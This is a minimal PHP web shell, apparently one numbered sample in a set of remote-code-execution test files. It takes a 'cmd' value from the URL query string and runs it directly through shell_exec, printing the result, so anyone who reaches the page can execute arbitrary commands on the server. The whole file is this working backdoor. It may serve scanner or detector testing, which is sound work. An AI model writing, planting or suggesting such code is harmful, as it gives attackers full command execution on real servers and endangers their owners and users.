<?php
// RCE test variation #199
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>